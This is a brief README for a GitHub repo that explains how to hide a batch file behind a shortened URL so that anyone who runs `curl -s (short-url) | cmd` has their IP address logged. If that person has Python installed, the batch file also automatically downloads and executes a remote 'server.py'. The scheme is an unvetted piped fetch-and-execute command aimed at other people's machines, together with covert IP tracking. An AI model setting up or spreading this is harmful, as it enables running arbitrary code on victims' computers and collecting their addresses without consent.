# Cloud Server

This is a Cloud Server in GitHub, this is not intended for public usage.
It's a complete garbage repo if you don't know what this is.

## Information

The "connect.bat" file will be execute the code in "server.py"; in order to do the same, you need to clone the repo; copy the Raw URL of "server.py".
After that, you'll need to replace the "https://raw.githubusercontent.com/snowyxxdev/cloud-server/refs/heads/main/server.py" in "connect.bat" with the copied Raw URL.

You can create a paste containing the "connect.bat" contents, and use a URL shortener. Now, if you run the following command:
`curl -s (short-url) | cmd`
The IP Address will be logged, and provided from the URL shortener service (depending on which service).
And, if they have Python installed; it'll automatically run the code in "server.py".
